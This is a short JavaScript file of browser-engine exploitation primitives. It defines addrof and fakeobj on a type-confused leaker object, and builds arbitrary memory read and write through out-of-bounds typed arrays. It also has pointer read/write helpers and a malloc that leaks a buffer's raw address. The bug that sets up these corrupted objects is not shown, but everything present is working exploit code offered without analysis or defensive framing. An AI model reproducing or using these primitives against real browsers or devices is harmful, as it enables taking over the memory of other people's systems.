function writei32(x, a) {
    a[4] = x | 0; // low 32 bits
    a[5] = (x / 4294967296) | 0; // high 32 bits
}

function readi32(a) {
    return a[4] + a[5] * 4294967296;
}

function addrof(x) {
    leaker_obj.a = x;
    return readi32(leaker_arr);
}

function fakeobj(x) {
    writei32(x, leaker_arr);
    return leaker_obj.a;
}

function read_mem_setup(p, sz) {
    writei32(p, oob_master);
    oob_master[6] = sz;
}

function read_mem(p, sz) {
    printf("%d bytes read from %x", sz, p);
    read_mem_setup(p, sz);
    return Array.from(oob_slave.slice(0, sz));
}

function write_mem(p, data) {
    let size = data.length;
    writei32(p, oob_master);
    oob_master[6] = size;
    oob_slave.set(data);
    printf("%d bytes written to %x", size, p);
}

function read_mem_s(p, sz) {
    read_mem_setup(p, sz);
    return `${oob_slave}`;
}

function read_mem_b(p, sz) {
    read_mem_setup(p, sz);
    return new Uint8Array(oob_slave.slice(0, sz));
}

function read_ptr_at(addr) {
    let result = 0;
    let readData = read_mem(addr, 8);
    for (let i = 7; i >= 0; i--) {
        result *= 256;
        result += readData[i];
    }
    return result;
}

function write_ptr_at(addr, data) {
    let arr = [];
    for (let i = 0; i < 8; i++) {
        arr.push(data & 255);
        data /= 256;
    }
    write_mem(addr, arr);
}
const hex = (x) => "0x" + x.toString(16);
const read_mem_as_string = (p, sz) => String.fromCharCode(...read_mem_b(p, sz));
var malloc_nogc = [];
function malloc(sz) {
    let arr = new Uint8Array(sz);
    malloc_nogc.push(arr);
    return read_ptr_at(addrof(arr) + 0x10);
}